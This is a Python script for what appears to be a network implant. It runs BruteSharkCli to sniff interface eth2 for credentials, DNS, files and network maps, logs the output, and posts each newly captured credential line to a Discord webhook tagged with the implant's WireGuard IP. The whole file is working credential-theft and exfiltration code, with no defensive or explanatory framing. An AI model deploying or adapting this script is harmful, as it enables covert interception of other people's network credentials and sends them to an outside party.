#!/usr/bin/env python3

from dotenv import load_dotenv
import subprocess
import json
import os
import requests

load_dotenv("/opt/implant/config.env")

LOG_FILE = os.getenv("BRUTESHARK_LOG")
CREDENTIALS_FILE = os.getenv("BRUTESHARK_CREDS")
WEBHOOK_URL = os.getenv("BRUTESHARK_DISCORD_WEBHOOK_URL")
IMPLANT_IP = os.getenv("IMPLANT_WG_IP")

os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)

# Load or initialize seen credentials
if os.path.exists(CREDENTIALS_FILE):
    with open(CREDENTIALS_FILE, "r") as f:
        try:
            seen = set(json.load(f))
        except Exception:
            seen = set()
else:
    seen = set()

# Start brutesharkcli and capture all output
with open(LOG_FILE, "a") as logfile:
    process = subprocess.Popen(
        ["BruteSharkCli", "-p", "-l", "eth2", "-m", "Credentials,NetworkMap,FileExtracting,DNS", "-o", "/opt/implant/logs/bruteshark"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )

    for line in process.stdout:
        line = line.strip()
        if not line:
            continue

        # Log everything to the .log file
        logfile.write(line + "\n")
        logfile.flush()

        # Process only lines containing credentials
        if "Credential" not in line or line in seen:
            continue

        # Send new credential to Discord
        try:
            requests.post(WEBHOOK_URL, json={"content": f"```[{IMPLANT_IP}] {line}```"}, timeout=3)
        except requests.RequestException:
            pass

        # Store in credentials.json
        seen.add(line)
        with open(CREDENTIALS_FILE, "w") as f:
            json.dump(list(seen), f)
